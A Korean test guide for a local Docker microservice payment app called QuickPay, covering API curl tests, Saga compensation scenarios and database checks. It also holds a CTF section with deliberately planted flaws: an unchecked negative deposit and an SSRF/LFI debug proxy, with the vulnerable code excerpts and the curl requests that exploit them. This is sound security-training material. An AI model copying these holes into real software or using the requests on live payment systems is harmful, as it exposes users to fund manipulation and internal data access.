# QuickPay 완전 테스트 가이드

## 🎯 테스트 개요

이 문서는 QuickPay MSA 시스템의 모든 API를 테스트하는 방법을 제공합니다.

**테스트 방법**:
1. **브라우저 UI 테스트** (권장) - 초보자 친화적
2. **curl 명령어 테스트** - API 직접 호출
3. **데이터베이스 검증** - 상태 확인

---

## 📋 목차

1. [환경 준비](#환경-준비)
2. [브라우저 UI 테스트](#브라우저-ui-테스트)
3. [Account Service 테스트](#account-service-테스트)
4. [Auth Service 테스트](#auth-service-테스트)
5. [Payment Service 테스트](#payment-service-테스트)
6. [Settlement Service 테스트](#settlement-service-테스트)
7. [CTF 취약점 테스트](#ctf-취약점-테스트)
8. [Saga Pattern 테스트](#saga-pattern-테스트)
9. [데이터베이스 검증](#데이터베이스-검증)

---

## 환경 준비

### 1. Docker 컨테이너 시작

```bash
cd C:\Users\wngus\quickpay-temp
docker-compose up --build -d
```

### 2. 서비스 상태 확인

```bash
docker-compose ps
```

**예상 출력**:
```
NAME                SERVICE          STATUS
account             account          running
api_gateway         api_gateway      running
auth                auth             running
db                  db               running
payment             payment          running
settlement          settlement       running
was                 was              running
```

### 3. 로그 확인

```bash
# 전체 로그
docker-compose logs -f

# 특정 서비스만
docker logs account -f
docker logs payment -f
docker logs settlement -f
```

---

## 브라우저 UI 테스트

### 🌐 접속 방법

```
http://localhost:8080/static/index.html
```

### ✅ 기능별 테스트

#### 1. 회원가입
1. User ID: `testuser01`
2. Password: `testuser01`
3. "회원가입" 버튼 클릭
4. **예상 결과**: `{"message": "회원가입 성공"}`
5. **초기 잔액**: 10,000원 자동 부여

#### 2. 로그인
1. User ID: `testuser01`
2. Password: `testuser01`
3. "로그인" 버튼 클릭
4. **예상 결과**: `{"message": "Login successful"}`
5. **부가 효과**: JWT 토큰이 HttpOnly 쿠키로 저장됨

#### 3. 잔액 조회
1. User ID: `testuser01`
2. "잔액 조회" 버튼 클릭
3. **예상 결과**: `{"balance": 10000}`

#### 4. 입금
1. User ID: `testuser01`
2. Amount: `5000`
3. "입금" 버튼 클릭
4. **예상 결과**: `{}`
5. 잔액 조회 → `15000원`

#### 5. 출금
1. User ID: `testuser01`
2. Amount: `3000`
3. "출금" 버튼 클릭
4. **예상 결과**: `{}`
5. 잔액 조회 → `12000원`

#### 6. 결제 (Saga Pattern)
1. User ID: `testuser01`
2. Merchant ID: `merchant_coffee`
3. Amount: `2000`
4. "결제하기" 버튼 클릭
5. **예상 결과**: `{}`
6. 잔액 조회 → `10000원`

#### 7. CTF 취약점 #1 - 음수 입금
1. User ID: `testuser01`
2. "음수 입금 공격" 버튼 클릭 (자동으로 -50000원 입금 시도)
3. **예상 결과**:
   - 초기 잔액: `10000원`
   - 최종 잔액: `-40000원`
   - **취약점 확인됨!** ✅

#### 8. CTF 취약점 #2 - SSRF
1. Filename: `flag.txt` (기본값)
2. "SSRF 공격" 버튼 클릭
3. **예상 결과**:
   - 응답: `FLAG{SSRF_AND_LFI_VULNERABILITY_FOUND}`
   - **FLAG 획득 성공!** ✅

---

## Account Service 테스트

### API 1: 회원가입

#### curl 명령어
```bash
curl -X POST http://localhost:8080/account/register \
  -H "Content-Type: application/json" \
  -d '{
    "user_id": "customer01",
    "password": "customer01"
  }'
```

#### 예상 응답
```json
{}
```
**HTTP Status**: 200 OK

#### 에러 케이스
```bash
# 필수 필드 누락
curl -X POST http://localhost:8080/account/register \
  -H "Content-Type: application/json" \
  -d '{"user_id": "test"}'

# 예상 응답: {"error": "MISSING_FIELDS", "message": "user_id와 password가 필요합니다."}
# HTTP Status: 400
```

```bash
# 중복 아이디
curl -X POST http://localhost:8080/account/register \
  -H "Content-Type: application/json" \
  -d '{
    "user_id": "customer01",
    "password": "customer01"
  }'

# 예상 응답: {"error": "ID_DUPLICATED", "message": "이미 존재하는 아이디입니다."}
# HTTP Status: 409
```

---

### API 2: 로그인

#### curl 명령어
```bash
curl -X POST http://localhost:8080/account/login \
  -H "Content-Type: application/json" \
  -d '{
    "user_id": "customer01",
    "password": "customer01"
  }' \
  -c cookies.txt -v
```

#### 예상 응답
```json
{"message": "Login successful"}
```
**HTTP Status**: 200 OK
**쿠키**: `jwt_token=eyJ0eXAiOiJKV1QiLCJhbGc...` (HttpOnly)

#### 로그인 흐름
```
1. Browser → API Gateway
   POST /account/login
   {"user_id": "customer01", "password": "customer01"}

2. API Gateway → Account Service
   POST http://account:5000/account/login
   {"user_id": "customer01", "password": "customer01"}

3. Account Service
   - bcrypt.checkpw() 검증
   - return {"user_id": "customer01"}, 200

4. API Gateway → Auth Service
   POST http://auth:5000/auth/login
   {"user_id": "customer01"}

5. Auth Service
   - JWT 토큰 생성
   - Set-Cookie: jwt_token=...; HttpOnly
   - return {"message": "Login successful"}

6. API Gateway → Browser
   200 OK with jwt_token cookie
```

#### 에러 케이스
```bash
# 잘못된 비밀번호
curl -X POST http://localhost:8080/account/login \
  -H "Content-Type: application/json" \
  -d '{
    "user_id": "customer01",
    "password": "wrongpass"
  }'

# 예상 응답: {"error": "AUTHENTICATION_FAILED", "message": "인증되지 않았습니다."}
# HTTP Status: 401
```

---

### API 3: 잔액 조회

#### curl 명령어
```bash
curl "http://localhost:8080/account/balance?user_id=customer01"
```

#### 예상 응답
```json
{"balance": 10000}
```
**HTTP Status**: 200 OK

#### 에러 케이스
```bash
# 존재하지 않는 사용자
curl "http://localhost:8080/account/balance?user_id=nonexistent"

# 예상 응답: {"error": "USER_NOT_FOUND", "message": "사용자를 찾을 수 없습니다."}
# HTTP Status: 404
```

---

### API 4: 입금

#### curl 명령어
```bash
curl -X POST http://localhost:8080/account/deposit \
  -H "Content-Type: application/json" \
  -d '{
    "user_id": "customer01",
    "amount": 5000
  }'
```

#### 예상 응답
```json
{}
```
**HTTP Status**: 200 OK

#### 잔액 확인
```bash
curl "http://localhost:8080/account/balance?user_id=customer01"
# 예상: {"balance": 15000}  (10000 + 5000)
```

#### CTF 취약점 - 음수 입금
```bash
curl -X POST http://localhost:8080/account/deposit \
  -H "Content-Type: application/json" \
  -d '{
    "user_id": "customer01",
    "amount": -50000
  }'

# 예상 응답: {}
# HTTP Status: 200 OK (취약점!)

# 잔액 확인
curl "http://localhost:8080/account/balance?user_id=customer01"
# 예상: {"balance": -35000}  (15000 - 50000)
```

---

### API 5: 출금

#### curl 명령어
```bash
curl -X POST http://localhost:8080/account/withdraw \
  -H "Content-Type: application/json" \
  -d '{
    "user_id": "customer01",
    "amount": 3000
  }'
```

#### 예상 응답
```json
{}
```
**HTTP Status**: 200 OK

#### 에러 케이스
```bash
# 잔액 부족
curl -X POST http://localhost:8080/account/withdraw \
  -H "Content-Type: application/json" \
  -d '{
    "user_id": "customer01",
    "amount": 999999
  }'

# 예상 응답: {"error": "INSUFFICIENT_FUNDS", "message": "출금 금액이 현재 잔액을 초과합니다."}
# HTTP Status: 403
```

```bash
# 음수 금액 (서버 검증 있음)
curl -X POST http://localhost:8080/account/withdraw \
  -H "Content-Type: application/json" \
  -d '{
    "user_id": "customer01",
    "amount": -5000
  }'

# 예상 응답: {"error": "INVALID_AMOUNT", "message": "출금 금액은 양수여야 합니다."}
# HTTP Status: 400
```

---

### API 6: 디버그 API (SSRF)

#### curl 명령어
```bash
curl "http://localhost:8080/account/internal/debug?filename=flag.txt"
```

#### 예상 응답
```
FLAG{SSRF_AND_LFI_VULNERABILITY_FOUND}
```
**HTTP Status**: 200 OK

#### 트래픽 흐름
```
1. Browser/curl
   ↓ GET /account/internal/debug?filename=flag.txt

2. API Gateway (PUBLIC_PATHS에 포함)
   ↓ 라우팅 허용

3. Account Service (SSRF 프록시)
   ↓ GET http://settlement:5000/settlement/internal/log_viewer?filename=flag.txt

4. Settlement Service
   ↓ if 'flag' in filename.lower():
   ↓ return "FLAG{SSRF_AND_LFI_VULNERABILITY_FOUND}", 200

5. Browser/curl
   ✅ FLAG 획득
```

---

## Auth Service 테스트

### API 1: 토큰 생성

**참고**: 이 API는 직접 호출하지 않습니다. API Gateway의 `/account/login`이 자동으로 호출합니다.

#### 직접 호출 (테스트용)
```bash
curl -X POST http://localhost:5000/auth/login \
  -H "Content-Type: application/json" \
  -d '{"user_id": "customer01"}' \
  -c auth_cookies.txt -v
```

#### 예상 응답
```json
{"message": "Login successful"}
```
**쿠키**: `jwt_token=eyJ0eXAiOiJKV1Qi...`

---

### API 2: 토큰 검증

#### curl 명령어
```bash
curl -X POST http://localhost:5000/auth/validate \
  -b auth_cookies.txt
```

#### 예상 응답
```json
{"user_id": "customer01"}
```
**HTTP Status**: 200 OK

#### 에러 케이스
```bash
# 토큰 없음
curl -X POST http://localhost:5000/auth/validate

# 예상 응답: {"error": "MISSING_TOKEN", "message": "JWT 쿠키가 누락되었습니다."}
# HTTP Status: 401
```

---

### API 3: 로그아웃

#### curl 명령어
```bash
curl -X POST http://localhost:8080/auth/logout \
  -b cookies.txt \
  -c cookies.txt -v
```

#### 예상 응답
```json
{"message": "로그아웃 성공, 토큰이 폐기되었습니다."}
```
**HTTP Status**: 200 OK
**쿠키**: `jwt_token=` (삭제됨)

---

## Payment Service 테스트

### API 1: 결제 처리 (Saga Pattern)

#### curl 명령어
```bash
curl -X POST http://localhost:8080/payments \
  -H "Content-Type: application/json" \
  -d '{
    "user_id": "customer01",
    "merchant_id": "merchant_coffee",
    "amount": 3000
  }'
```

#### 예상 응답 (성공 시)
```json
{}
```
**HTTP Status**: 200 OK

#### Saga Pattern 흐름 (정상)
```
1. Payment Service
   ↓ transaction_id = uuid.uuid4()

2. Step 1: 계좌 출금
   ↓ POST http://account:5000/account/withdraw
   ↓ {"user_id": "customer01", "amount": 3000}
   ↓ 잔액: 10000 → 7000
   ✅ 200 OK

3. Step 2: 정산 기록 저장
   ↓ POST http://settlement:5000/settlement/transaction
   ↓ {"transaction_id": "...", "merchant_id": "merchant_coffee", "amount": 3000}
   ✅ 200 OK

4. Payment Service
   ✅ return {}, 200
```

#### 잔액 확인
```bash
curl "http://localhost:8080/account/balance?user_id=customer01"
# 예상: {"balance": 7000}  (10000 - 3000)
```

---

## Settlement Service 테스트

### API 1: 거래 내역 저장

**참고**: 이 API는 Payment Service가 자동으로 호출합니다.

#### 직접 호출 (테스트용)
```bash
curl -X POST http://localhost:5000/settlement/transaction \
  -H "Content-Type: application/json" \
  -d '{
    "transaction_id": "test-txn-001",
    "merchant_id": "merchant_coffee",
    "user_id": "customer01",
    "amount": 3000
  }'
```

#### 예상 응답
```json
{"status": "success"}
```
**HTTP Status**: 200 OK

---

### API 2: 정산 실행

#### curl 명령어
```bash
curl -X POST http://localhost:5000/settlement/execute \
  -H "Content-Type: application/json" \
  -d '{
    "merchant_id": "merchant_coffee"
  }'
```

#### 예상 응답
```json
{
  "message": "정산 완료",
  "merchant_id": "merchant_coffee",
  "settled_amount": 6000,
  "new_balance": 0
}
```
**HTTP Status**: 200 OK

**설명**:
- 가맹점의 누적 잔액을 정산 (출금)
- 잔액을 0으로 초기화

---

### API 3: 로그 뷰어 (CTF 타겟)

#### curl 명령어
```bash
curl "http://localhost:5000/settlement/internal/log_viewer?filename=flag.txt"
```

#### 예상 응답
```
FLAG{SSRF_AND_LFI_VULNERABILITY_FOUND}
```
**HTTP Status**: 200 OK

**참고**: 이 API는 내부 네트워크에서만 접근 가능 (API Gateway를 통하지 않음)

---

## CTF 취약점 테스트

### 취약점 #1: 음수 입금 (PDF Page 14)

#### 공격 시나리오
1. 정상 회원가입 및 초기 잔액 확인
2. 음수 금액으로 입금 요청
3. 잔액 감소 확인 (실질적 출금)

#### 테스트 스크립트
```bash
# 1. 회원가입
curl -X POST http://localhost:8080/account/register \
  -H "Content-Type: application/json" \
  -d '{"user_id":"victim","password":"victim"}'

# 2. 초기 잔액 확인
curl "http://localhost:8080/account/balance?user_id=victim"
# 예상: {"balance": 10000}

# 3. 음수 입금 공격
curl -X POST http://localhost:8080/account/deposit \
  -H "Content-Type: application/json" \
  -d '{"user_id":"victim","amount":-50000}'

# 4. 최종 잔액 확인
curl "http://localhost:8080/account/balance?user_id=victim"
# 예상: {"balance": -40000}  ← 취약점 확인!
```

#### 브라우저 테스트
1. `http://localhost:8080/static/index.html` 접속
2. User ID: `victim`, Password: `victim` 회원가입
3. "음수 입금 공격" 버튼 클릭
4. 결과 확인:
   - 초기 잔액: 10,000원
   - 최종 잔액: -40,000원
   - **✅ 취약점 확인됨!**

#### 취약 코드 위치
`account/app.py:213-228`
```python
# CTF 취약점: 음수 체크 안 함
cursor.execute("UPDATE accounts SET balance = balance + ? WHERE user_id = ?",
               (amount, user_id))
# amount가 -50000이면 balance - 50000 실행됨
```

---

### 취약점 #2: SSRF + LFI (PDF Page 22)

#### 공격 시나리오
1. Account Service의 디버그 API 발견
2. SSRF를 통해 Settlement Service 내부 API 접근
3. LFI를 통해 flag.txt 파일 읽기

#### 테스트 스크립트
```bash
# 직접 FLAG 획득
curl "http://localhost:8080/account/internal/debug?filename=flag.txt"

# 예상 응답:
# FLAG{SSRF_AND_LFI_VULNERABILITY_FOUND}
```

#### 브라우저 테스트
1. `http://localhost:8080/static/index.html` 접속
2. Filename 입력: `flag.txt`
3. "SSRF 공격" 버튼 클릭
4. 결과 확인:
   - 응답: `FLAG{SSRF_AND_LFI_VULNERABILITY_FOUND}`
   - **✅ FLAG 획득 성공!**

#### 공격 체인
```
[Browser]
  ↓ GET /account/internal/debug?filename=flag.txt
[API Gateway] (PUBLIC_PATHS 포함)
  ↓ 라우팅 허용
[Account Service] (account/app.py:287-321)
  ↓ SSRF 프록시 역할
  ↓ requests.get(f"{SETTLEMENT_SERVICE_URL}/settlement/internal/log_viewer?filename={filename}")
[Settlement Service] (settlement/app.py:119-143)
  ↓ if 'flag' in filename.lower():
  ↓ return "FLAG{SSRF_AND_LFI_VULNERABILITY_FOUND}", 200
[Browser]
  ✅ FLAG 획득
```

#### 취약 코드 위치

**account/app.py:305-317**
```python
filename = request.args.get('filename', 'access.log')  # 사용자 입력

response = requests.get(
    f"{SETTLEMENT_SERVICE_URL}/settlement/internal/log_viewer",
    params={'filename': filename},  # 검증 없이 전달 (SSRF!)
    timeout=5
)
return response.text, response.status_code
```

**settlement/app.py:125-129**
```python
filename = request.args.get('filename', 'access.log')

if 'flag' in filename.lower():  # LFI 시뮬레이션
    return "FLAG{SSRF_AND_LFI_VULNERABILITY_FOUND}", 200
```

---

## Saga Pattern 테스트

### 시나리오 1: 정상 결제 (Settlement 정상)

#### 테스트 단계
```bash
# 1. 회원가입 및 초기 잔액 확인
curl -X POST http://localhost:8080/account/register \
  -H "Content-Type: application/json" \
  -d '{"user_id":"customer01","password":"customer01"}'

curl "http://localhost:8080/account/balance?user_id=customer01"
# 예상: {"balance": 10000}

# 2. Settlement 서비스 정상 확인
docker-compose ps settlement
# 예상: STATUS = running

# 3. 결제 요청
curl -X POST http://localhost:8080/payments \
  -H "Content-Type: application/json" \
  -d '{
    "user_id": "customer01",
    "merchant_id": "merchant_coffee",
    "amount": 3000
  }'

# 예상 응답: {}
# HTTP Status: 200 OK

# 4. 잔액 확인
curl "http://localhost:8080/account/balance?user_id=customer01"
# 예상: {"balance": 7000}  (10000 - 3000)
```

#### 로그 확인
```bash
docker logs payment | tail -20
```

**예상 로그**:
```
[결제 시작] transaction_id=abc-123, user_id=customer01, amount=3000
[Step 1] 계좌 출금 요청 중...
[Step 1 성공] 출금 완료
[Step 2] 정산 기록 저장 요청 중...
[Step 2 성공] 정산 기록 저장 완료
[결제 완료] transaction_id=abc-123
```

---

### 시나리오 2: Settlement 장애 시 보상 트랜잭션

#### 테스트 단계
```bash
# 1. 현재 잔액 확인
curl "http://localhost:8080/account/balance?user_id=customer01"
# 예상: {"balance": 7000}

# 2. Settlement 서비스 중지 (장애 시뮬레이션)
docker stop settlement

# 3. 결제 시도 (실패 예상)
curl -X POST http://localhost:8080/payments \
  -H "Content-Type: application/json" \
  -d '{
    "user_id": "customer01",
    "merchant_id": "merchant_coffee",
    "amount": 2000
  }'

# 예상 응답:
# {
#   "error": "TRANSACTION_STORE_FAIL",
#   "message": "결제는 실패했으나, 잔액은 복구되었습니다. 잠시 후 다시 시도해주세요."
# }
# HTTP Status: 500

# 4. 잔액 확인 (보상 트랜잭션 성공 여부)
curl "http://localhost:8080/account/balance?user_id=customer01"
# 예상: {"balance": 7000}  ← 변화 없음! (보상 성공 ✅)
```

#### 로그 확인
```bash
docker logs payment | tail -30
```

**예상 로그**:
```
[결제 시작] transaction_id=xyz-789, user_id=customer01, amount=2000
[Step 1] 계좌 출금 요청 중...
[Step 1 성공] 출금 완료 (잔액: 7000 → 5000)
[Step 2] 정산 기록 저장 요청 중...
[Step 2 실패] 정산서비스 연결 오류: Connection refused
[보상 트랜잭션 필요] Step 2 실패로 인한 출금 취소 시작
[보상 트랜잭션 시작] transaction_id=xyz-789, user_id=customer01, amount=2000
[보상 시도 1/5] 입금 요청 중...
[보상 성공] transaction_id=xyz-789 (잔액: 5000 → 7000)
[결제 실패] 보상 트랜잭션 완료, 사용자 잔액 복구됨
```

#### 보상 트랜잭션 흐름
```
1. Payment Service
   ↓ transaction_id 생성

2. Step 1: 계좌 출금
   ↓ POST http://account:5000/account/withdraw
   ↓ {"user_id": "customer01", "amount": 2000}
   ↓ 잔액: 7000 → 5000
   ✅ 200 OK

3. Step 2: 정산 기록 저장
   ↓ POST http://settlement:5000/settlement/transaction
   ❌ Connection refused (Settlement 중지됨)

4. 보상 트랜잭션 시작 (compensate_withdraw)
   ↓ for attempt in range(1, 6):  # 최대 5번
   ↓   POST http://account:5000/account/deposit
   ↓   {"user_id": "customer01", "amount": 2000}
   ✅ 200 OK (잔액: 5000 → 7000 복구!)

5. Payment Service
   ↓ return {"error": "TRANSACTION_STORE_FAIL", ...}, 500
```

#### Settlement 서비스 재시작
```bash
docker start settlement

# 다시 정상 결제 시도
curl -X POST http://localhost:8080/payments \
  -H "Content-Type: application/json" \
  -d '{
    "user_id": "customer01",
    "merchant_id": "merchant_coffee",
    "amount": 2000
  }'

# 예상 응답: {}
# HTTP Status: 200 OK

# 잔액 확인
curl "http://localhost:8080/account/balance?user_id=customer01"
# 예상: {"balance": 5000}  (7000 - 2000)
```

---

### 시나리오 3: 보상 트랜잭션 재시도 로직 테스트

#### 테스트 목적
Account 서비스가 일시적으로 중단되었다가 복구될 때 재시도 로직 검증

#### 테스트 단계
```bash
# 1. Settlement만 중지 (Account는 정상)
docker stop settlement

# 2. Account도 중지 (일시적 장애 시뮬레이션)
docker stop account

# 3. 결제 시도 (Step 1부터 실패)
curl -X POST http://localhost:8080/payments \
  -H "Content-Type: application/json" \
  -d '{
    "user_id": "customer01",
    "merchant_id": "merchant_coffee",
    "amount": 2000
  }'

# 예상 응답:
# {"error": "SERVICE_UNAVAILABLE", "message": "계좌관리서비스에 연결할 수 없습니다."}
# HTTP Status: 503

# 4. Account 서비스만 재시작
docker start account
sleep 3

# 5. 다시 결제 시도 (Step 1 성공, Step 2 실패, 보상 필요)
curl -X POST http://localhost:8080/payments \
  -H "Content-Type: application/json" \
  -d '{
    "user_id": "customer01",
    "merchant_id": "merchant_coffee",
    "amount": 2000
  }'

# 6. 로그에서 보상 트랜잭션 재시도 확인
docker logs payment | tail -40
```

**예상 로그 (재시도 성공)**:
```
[보상 시도 1/5] 입금 요청 중...
[보상 성공] transaction_id=abc-123
[결제 실패] 보상 트랜잭션 완료, 사용자 잔액 복구됨
```

**예상 로그 (Account 장애 시 재시도)**:
```
[보상 시도 1/5] 입금 요청 중...
[보상 실패] 연결 오류: Connection refused
2초 후 재시도...
[보상 시도 2/5] 입금 요청 중...
[보상 실패] 연결 오류: Connection refused
2초 후 재시도...
[보상 시도 3/5] 입금 요청 중...
[보상 성공] transaction_id=abc-123  ← Account 복구 후 성공!
```

---

## 데이터베이스 검증

### Account Service DB (account.db)

#### 접속 방법
```bash
docker exec -it account sqlite3 /app/db/account.db
```

#### 계좌 조회
```sql
-- 전체 계좌 조회
SELECT user_id, balance, account_number, created_at
FROM accounts;

-- 특정 사용자 잔액
SELECT user_id, balance
FROM accounts
WHERE user_id = 'customer01';

-- 음수 잔액 계좌 (CTF 공격 피해자)
SELECT user_id, balance
FROM accounts
WHERE balance < 0;
```

#### 예상 결과
```
sqlite> SELECT user_id, balance FROM accounts;
┌────────────┬─────────┐
│  user_id   │ balance │
├────────────┼─────────┤
│ admin      │ 1000000 │
│ user1      │  50000  │
│ customer01 │   5000  │
│ victim     │ -40000  │ ← 음수 입금 공격 피해자
└────────────┴─────────┘
```

---

### Settlement Service DB (PostgreSQL)

#### 접속 방법
```bash
docker exec -it db psql -U postgres -d settlement
```

#### 거래 내역 조회
```sql
-- 전체 거래 내역
SELECT id, transaction_id, merchant_id, amount, created_at
FROM settlements
ORDER BY created_at DESC;

-- 특정 가맹점 거래 내역
SELECT transaction_id, amount, created_at
FROM settlements
WHERE merchant_id = 'merchant_coffee'
ORDER BY created_at DESC;

-- 가맹점별 총 거래액
SELECT merchant_id, SUM(amount) as total_amount
FROM settlements
GROUP BY merchant_id;
```

#### 가맹점 잔액 조회
```sql
SELECT merchant_id, balance
FROM merchant_balances;
```

#### 예상 결과
```
settlement=# SELECT merchant_id, balance FROM merchant_balances;
┌─────────────────┬─────────┐
│   merchant_id   │ balance │
├─────────────────┼─────────┤
│ merchant_coffee │   5000  │
└─────────────────┴─────────┘

settlement=# SELECT * FROM settlements ORDER BY created_at DESC LIMIT 5;
┌────┬──────────────────────────────────────┬─────────────────┬────────┬─────────────────────────┐
│ id │           transaction_id             │   merchant_id   │ amount │       created_at        │
├────┼──────────────────────────────────────┼─────────────────┼────────┼─────────────────────────┤
│  3 │ 7d8e9f0a-1b2c-3d4e-5f6a-7b8c9d0e1f2a │ merchant_coffee │   2000 │ 2025-01-18 14:30:00     │
│  2 │ 1a2b3c4d-5e6f-7a8b-9c0d-1e2f3a4b5c6d │ merchant_coffee │   3000 │ 2025-01-18 14:15:00     │
│  1 │ a1b2c3d4-e5f6-7890-abcd-ef1234567890 │ merchant_store  │  10000 │ 2025-01-18 14:00:00     │
└────┴──────────────────────────────────────┴─────────────────┴────────┴─────────────────────────┘
```

---

### Auth Service DB (auth.db)

#### 접속 방법
```bash
docker exec -it auth sqlite3 /app/db/auth.db
```

#### 사용자 조회
```sql
SELECT user_id, created_at
FROM users;
```

#### 블랙리스트 토큰 조회
```sql
-- 현재 유효한 블랙리스트 토큰
SELECT jti, expires_at, datetime(expires_at, 'unixepoch') as expires_at_readable
FROM revoked_tokens
WHERE expires_at > strftime('%s', 'now');
```

---

## 🧪 통합 테스트 시나리오

### 시나리오: 완전한 사용자 여정

```bash
# 1. 회원가입
curl -X POST http://localhost:8080/account/register \
  -H "Content-Type: application/json" \
  -d '{"user_id":"alice","password":"alice123"}'

# 2. 로그인
curl -X POST http://localhost:8080/account/login \
  -H "Content-Type: application/json" \
  -d '{"user_id":"alice","password":"alice123"}' \
  -c cookies.txt

# 3. 초기 잔액 확인
curl "http://localhost:8080/account/balance?user_id=alice"
# 예상: {"balance": 10000}

# 4. 입금
curl -X POST http://localhost:8080/account/deposit \
  -H "Content-Type: application/json" \
  -d '{"user_id":"alice","amount":5000}'

# 5. 잔액 확인
curl "http://localhost:8080/account/balance?user_id=alice"
# 예상: {"balance": 15000}

# 6. 결제 (커피숍)
curl -X POST http://localhost:8080/payments \
  -H "Content-Type: application/json" \
  -d '{"user_id":"alice","merchant_id":"merchant_coffee","amount":4500}'

# 7. 잔액 확인
curl "http://localhost:8080/account/balance?user_id=alice"
# 예상: {"balance": 10500}

# 8. 출금
curl -X POST http://localhost:8080/account/withdraw \
  -H "Content-Type: application/json" \
  -d '{"user_id":"alice","amount":2000}'

# 9. 최종 잔액 확인
curl "http://localhost:8080/account/balance?user_id=alice"
# 예상: {"balance": 8500}

# 10. 로그아웃
curl -X POST http://localhost:8080/auth/logout \
  -b cookies.txt
```

---

## 📊 테스트 체크리스트

### Account Service
- [ ] 회원가입 성공
- [ ] 회원가입 중복 에러
- [ ] 로그인 성공
- [ ] 로그인 실패 (잘못된 비밀번호)
- [ ] 잔액 조회 성공
- [ ] 잔액 조회 실패 (존재하지 않는 사용자)
- [ ] 입금 성공
- [ ] 출금 성공
- [ ] 출금 실패 (잔액 부족)
- [ ] 디버그 API (SSRF)

### Auth Service
- [ ] JWT 토큰 생성
- [ ] JWT 토큰 검증
- [ ] 로그아웃 (쿠키 삭제)

### Payment Service
- [ ] 정상 결제 (Saga Pattern)
- [ ] Settlement 장애 시 보상 트랜잭션
- [ ] 보상 트랜잭션 재시도 로직

### Settlement Service
- [ ] 거래 내역 저장
- [ ] 정산 실행
- [ ] 로그 뷰어 (CTF 타겟)

### CTF 취약점
- [ ] 음수 입금 공격 성공
- [ ] SSRF 공격으로 FLAG 획득

### 데이터베이스
- [ ] Account DB 상태 확인
- [ ] Settlement DB 거래 내역 확인
- [ ] Auth DB 토큰 블랙리스트 확인

---

## 🔧 문제 해결

### 문제 1: 서비스 연결 실패

**증상**: `Connection refused` 또는 `503 Service Unavailable`

**해결**:
```bash
# 모든 서비스 재시작
docker-compose down
docker-compose up --build -d

# 서비스 상태 확인
docker-compose ps

# 로그 확인
docker-compose logs -f
```

---

### 문제 2: 데이터베이스 초기화 필요

**Account Service**:
```bash
docker exec -it account rm /app/db/account.db
docker-compose restart account
```

**Settlement Service**:
```bash
docker exec -it db psql -U postgres -d settlement -c "DROP TABLE settlements; DROP TABLE merchant_balances;"
docker-compose restart settlement
```

---

### 문제 3: JWT 토큰 만료

**증상**: `{"error": "TOKEN_EXPIRED"}`

**해결**:
```bash
# 다시 로그인
curl -X POST http://localhost:8080/account/login \
  -H "Content-Type: application/json" \
  -d '{"user_id":"customer01","password":"customer01"}' \
  -c cookies.txt
```

---

## 📝 추가 참고 문서

- `API_IMPLEMENTATION_STATUS.md` - API 구현 상태 확인
- `SAGA_PATTERN_TEST.md` - Saga Pattern 상세 테스트
- `IMPROVEMENTS.md` - 개선 사항 문서
- `README.md` - 프로젝트 개요

---

## ✅ 테스트 완료 기준

모든 API가 다음 조건을 만족하면 테스트 완료:

1. **기능 테스트**: 모든 정상 케이스 통과 ✅
2. **에러 처리**: 모든 에러 케이스 적절히 처리 ✅
3. **보안**: CTF 취약점 정상 작동 ✅
4. **Saga Pattern**: 보상 트랜잭션 원자성 보장 ✅
5. **데이터베이스**: 트랜잭션 일관성 유지 ✅
